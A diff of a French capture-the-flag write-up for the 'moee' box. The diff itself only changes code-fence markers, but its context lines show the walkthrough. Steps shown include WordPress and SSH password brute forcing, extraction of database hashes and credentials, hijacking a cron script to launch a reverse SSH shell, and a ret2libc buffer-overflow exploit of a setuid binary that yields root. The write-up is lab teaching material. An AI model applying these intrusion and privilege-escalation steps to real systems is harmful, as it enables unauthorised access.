@@ -12,7 +12,7 @@ Pour ceux qui souhaiteraient se jeter dans cette aventure, et sans spoiler trop,
 
 Le final nécessite des connaissances en exploitation de binaire, ce qui est indiqué noir sur blanc dans la description du CTF.  
 
-```plain
+```
 $ sudo nmap -T5 -p- -sCV 192.168.56.19 
 [sudo] Mot de passe de root :  
 Starting Nmap 7.92 ( https://nmap.org )
@@ -34,7 +34,7 @@ PORT      STATE SERVICE VERSION
 
 On sait immédiatement qu'il y a un Wordpress donc on dégaine l'outil attendu pour ce type de situation :  
 
-```plain
+```
 $ docker run -v /tools/wordlists/:/data --add-host moee:192.168.56.19 \
   -it --rm wpscanteam/wpscan --url http://moee/ -e u,ap,at
 --- snip ---
@@ -78,14 +78,14 @@ Cette version de Wordpress est normalement touchée par la vulnérabilité *CVE-
 
 Là j'ai plutôt orienté mon attention sur le brute-force des différents comptes. J'ai voulu faire l'attaque avec l'option *--password-attack xmlrpc-multicall* qui permet d'essayer un batch de différents mots de passe pour chaque requête mais cela ne m'a amené nul part.  
 
-```plain
+```
 $  docker run -v /tools/wordlists/:/data --add-host moee:192.168.56.19 -it --rm wpscanteam/wpscan \
   --url http://moee/ -U joxter,snufkin,boe,user -P /data/rockyou.txt --password-attack xmlrpc-multicall
 ```
 
 En retirant cette option on passe donc sur un mode de brute force plus lent mais qui est compatible avec la configuration du Wordpress. Comptez tout de même 40 bonnes minutes avant d'obtenir un résultat.  
 
-```plain
+```
 [!] Valid Combinations Found:
  | Username: joxter, Password: 1a2b3c4d
 ```
@@ -107,7 +107,7 @@ el8 gr3p 5ki11z
 
 Une fois un ReverseSSH mis en place je récupère le premier flag :  
 
-```plain
+```
 www-data@moee:/var/www/public_html$ cat flag1.txt  
 Congrats, finally you exploited the damn vulnerable plugin and got the initial Shell.
 Now your next task is to look for clue which lend you further and it isn't far from your home directory.  
@@ -135,7 +135,7 @@ define( 'DB_HOST', 'localhost' );
 
 Je peux extraire les hashs des utilisateurs Wordpress :  
 
-```plain
+```
 www-data@moee:/var/www/public_html$ mysql -u user -p wp_database 
 Enter password:  
 Reading table information for completion of table and column names 
@@ -177,7 +177,7 @@ mysql> select user_login, user_pass from wp_users;  
 
 J'ai tenté en vain de les casser avec *Penglab* (des bébés pingouins sont donc morts sans raison valable, désolé) :  
 
-```plain
+```
 !echo '$P$BSsAlgA7qDOQFfZYVze6KO48091sn81' > /tmp/hash.txt
 !echo '$P$BghGdW9kvudcJWOnTi.TfmJw7tzsgR/' >> /tmp/hash.txt
 !echo '$P$B7SOjzTIu5bBYTnO1SfWyL2bJF51xn0' >> /tmp/hash.txt
@@ -187,14 +187,14 @@ J'ai tenté en vain de les casser avec *Penglab* (des bébés pingouins sont don
 
 Sur le système se trouve deux utilisateurs autre que root :  
 
-```plain
+```
 uid=1000(Joxter) gid=1000(Joxter) groups=1000(Joxter),1002(devsec) 
 uid=1001(Boe) gid=1001(Boe) groups=1001(Boe),1002(devsec),1003(supergroup)
 ```
 
 J'ai relevé quelque chose d'assez mystérieux avec le dossier */opt* que je ne peux pas accéder :  
 
-```plain
+```
 www-data@moee:/var/www/public_html$ find / -group devsec 2> /dev/null     
 /home/Joxter 
 /opt
@@ -204,7 +204,7 @@ drwxr-x--- 2 Boe devsec 4096 Nov 22  2020 /opt/
 
 La chose est confirmée avec *pspy64* :  
 
-```plain
+```
 2022/01/28 09:20:01 CMD: UID=0    PID=19891  | /usr/sbin/CRON -f  
 2022/01/28 09:20:01 CMD: UID=1001 PID=19892  | /bin/sh -c python3 /opt/Flag.py
 ```
@@ -213,7 +213,7 @@ A ce stade cette information ne m'est toutefois d'aucune utilité.
 
 Finalement un grep des familles m'a fait remarqué un fichier que LinPEAS n'avait pas détecté :  
 
-```plain
+```
 $ grep --include "*.php" -l -r -i password .
 --- snip ---
 wp-includes/wp-db.php
@@ -230,7 +230,7 @@ La raison de ce manquement est sans doute liée au fait que les creds soient en 
 
 De quel service on parle ? Après des échecs il ne s'agit pas de SSH. Le mot de passe est accepté pour l'utilisateur root de MySQL :  
 
-```plain
+```
 mysql> show databases;
 +--------------------+
 | Database           |
@@ -245,7 +245,7 @@ mysql> show databases;
 
 Notez la présence de la base *useful\_things* qu'on ne voyait pas précédemment.  
 
-```plain
+```
 mysql> select * from user_details; 
 +---------+----------+-------------------------------+ 
 | User_id | Username | Password                      | 
@@ -260,7 +260,7 @@ mysql> select * from user_details;
 
 Gotcha ! Le pastebin indiqué contient une série de passwords et adresses emails.  
 
-```plain
+```
 $ awk '{ print $1 }' 0wstpQk0.txt > pass.txt
 $ hydra -l Joxter -P pass.txt ssh://192.168.56.19 
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). 
@@ -280,7 +280,7 @@ New challenger
 
 Avec le compte obtenu on peut obtenir le second flag et agir sur la tache CRON lancée avec l'utilisateur Boe.  
 
-```plain
+```
 Joxter@moee:~$ cat flag2.txt  
 Congrats, Joxter though you were lazy and worry-free you got yourself with some OSINT.
 Now it's your time to use the premonitions which you call "Forebodings" to protect Boe from a bigger disaster things.
@@ -297,7 +297,7 @@ drwxr-xr-x 22 root root   4096 Nov 11  2020 ..
 
 J'ai d'abord modifié le script Python pour qu'il ajoute ma clé publique SSH aux clés autorisées. L'action se passe correctement d'après *pspy* :  
 
-```plain
+```
 2022/01/28 10:04:01 CMD: UID=0    PID=3992   | /usr/sbin/CRON -f 
 2022/01/28 10:04:01 CMD: UID=1001 PID=3993   | python3 /opt/Flag.py 
 2022/01/28 10:04:01 CMD: UID=1001 PID=3994   | sh -c mkdir -p /home/Boe/.ssh/ 
@@ -315,7 +315,7 @@ os.system("/var/www/public_html/reverse-sshx64 &")
 
 Par défaut ça nous ouvre un shell sur le port 31337. Le mot de passe est *letmeinbrudipls*.  
 
-```plain
+```
 Joxter@moee:/var/www/public_html$ ss -lntp 
 State      Recv-Q Send-Q                                                               Local Address:Port                                                                           Peer Address:Port  
 LISTEN     0      128                                                                              *:22                                                                                        *:*      
@@ -327,7 +327,7 @@ LISTEN     0      128                         �
 
 L'utilisateur *Boe* possède un binaire setuid root, le boss final en somme (NB: ReverseSSH se moque du nom d'utilisateur d'où l'incohérence entre l'utilisateur utilisé et celui obtenu) :  
 
-```plain
+```
 Joxter@moee:/var/www/public_html$ ssh -p 31337 127.0.0.1
 The authenticity of host '[127.0.0.1]:31337 ([127.0.0.1]:31337)' can't be established.
 RSA key fingerprint is 9c:e4:6e:a9:dc:0a:4f:00:ea:6d:da:da:da:e6:09:57.
@@ -346,7 +346,7 @@ Once again, thanks Joxter for protecting me(Boe) from the disaster which was abo
 
 Un extrait des chaînes de caractères présentes dans le binaire permet d'avoir une idée globale de ce qu'il se passe :  
 
-```plain
+```
 /lib64/ld-linux-x86-64.so.2 
 libc.so.6 
 gets 
@@ -376,7 +376,7 @@ _DYNAMIC
 
 La référence à *ret2libc.c* fait office de clin d’œil amusant. On peut lancer ldd plusieurs fois consécutives pour admirer la randomisation de la stack :  
 
-```plain
+```
 Boe@moee:/home/Boe$ ldd ./ropit  
         linux-vdso.so.1 (0x00007ffee2d3f000) 
         libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb709086000) 
@@ -417,7 +417,7 @@ La vulnérabilité tient du fait que la fonction *gets()* est utilisée et qu'el
 
 L'écrasement du registre RIP se fera sur la dernière instruction *ret*. On peut donc placer un breakpoint, saisir l'équivalent de l'expression python *"A" \* 1024 + "B" \* 4 + "C" \* 4 + "D" \* 4 + "E" \* 4* et regarder sur la pile à quoi correspondra la future valeur de ce registre :  
 
-```plain
+```
 (gdb) b * 0x0000000000400574
 Breakpoint 1 at 0x400574
 (gdb) r 
@@ -585,7 +585,7 @@ Je ne suis pas parvenu à faire fonctionne *pwntools* sur le ReverseSSH qui éco
 
 Avant l'exécution je créé un lien symbolique *zR* pointant vers */bin/bash* :  
 
-```plain
+```
 Joxter@moee:~$ ln -s /bin/bash zR 
 Joxter@moee:~$ ls -l 
 total 4 
@@ -597,7 +597,7 @@ Joxter@moee:~$ ls -l /bin/bash  
 
 Utilisation de mon exploit avec *pwntools* qui fait sa magie :  
 
-```plain
+```
 $ python exploit.py  
 [+] Connecting to 192.168.56.19 on port 22: Done 
 [*] Joxter@192.168.56.19: 
@@ -636,7 +636,7 @@ Let's see what you can use to get the root of this box.
 
 Et c'est le BUT !  
 
-```plain
+```
 Joxter@moee:~$ ls -l /bin/bash  
 -rwsr-sr-x 1 root root 1029624 Mar 25  2019 /bin/bash 
 Joxter@moee:~$ /bin/bash -p 
